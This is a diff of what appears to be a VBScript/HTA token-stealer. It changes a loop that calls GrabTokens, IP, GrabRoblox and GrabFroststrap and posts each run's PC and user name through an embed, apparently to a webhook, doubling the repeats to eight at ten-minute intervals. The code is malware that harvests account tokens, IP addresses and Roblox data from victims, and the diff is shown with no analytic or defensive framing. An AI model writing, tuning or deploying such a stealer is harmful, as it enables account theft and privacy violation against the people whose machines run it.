@@ -34,15 +34,15 @@ For downloadAttempt = 1 To 2
     If downloadAttempt < 2 Then Call SleepMinutes(2)
 Next
 
-' --- Re-run grab chain 4x (every 5 min) ---
+' --- Re-run grab chain 8x (every 10 min) ---
 Dim runCount
-For runCount = 1 To 4
-    Call PostEmbed(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003)
+For runCount = 1 To 8
+    Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
     Call GrabTokens
     Call IP
     Call GrabRoblox
     Call GrabFroststrap
-    If runCount < 4 Then Call SleepMinutes(5)
+    If runCount < 8 Then Call SleepMinutes(10)
 Next
 
 window.close()
